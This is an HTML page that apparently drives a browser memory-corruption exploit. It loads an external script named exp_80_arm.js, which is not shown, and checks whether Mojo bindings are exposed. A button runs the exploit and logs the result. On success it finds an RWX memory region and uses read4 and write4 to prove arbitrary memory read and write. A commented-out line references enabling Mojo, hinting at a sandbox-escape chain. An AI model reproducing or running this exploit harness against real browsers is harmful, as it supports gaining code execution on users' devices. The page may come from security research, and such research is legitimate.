<html>
	<font size=30>
    <body>
        hi there..
        <input type="button" style="width:300pt; height:60pt; font-size: 30px" value="Exploit me" onclick="do_exploit()">
        <input type="button" style="width:300pt; height:60pt; font-size: 30px" value="Reload" onclick="reload()">
        <pre id='log'></pre>
        <script>

let oob = undefined;

function mylog(string) {
  var log = document.getElementById('log');
  if (log) {
    log.innerText += string += '\n';
  }
}

function reload() {
	if (typeof oob !== "undefined") {
		oob.cleanup();
	}
	alert("window.location.reload()");
	window.location.reload();
}

mylog("CHECK:: typeof(Mojo) == " + typeof(Mojo));
mylog("CHECK:: typeof(mojo) == " + typeof(mojo));

		</script>


        <script lang="javascript" src="./exp_80_arm.js?v=1"></script>
        <!-- script lang="javascript" src="./5825_enable_mojo.js?v=31"></script -->
        <script>

function do_exploit() {
	mylog("Exploiting...");
	oob = new exp_6418_80_arm();
	if (oob.success) {
		mylog("Exploiting succeeded.");
		var rwx = oob.get_rwx();
		mylog("rwx addr: " + oob.tohex(rwx));
		var first_4bytes = oob.read4(rwx);
		mylog("first_4bytes: " + oob.tohex(first_4bytes));

		test_4bytes = 0x41424345;
		mylog("test_4bytes: " + oob.tohex(test_4bytes));
		mylog("before write, first 4bytes of rwx: " + oob.tohex(oob.read4(rwx)));

		oob.write4(rwx, test_4bytes);
		mylog("after write, first 4bytes of rwx: " + oob.tohex(oob.read4(rwx)));

		oob.cleanup();

	} else {
		mylog("Exploiting failed.")
	}
}

        </script>

    </body>
</html>
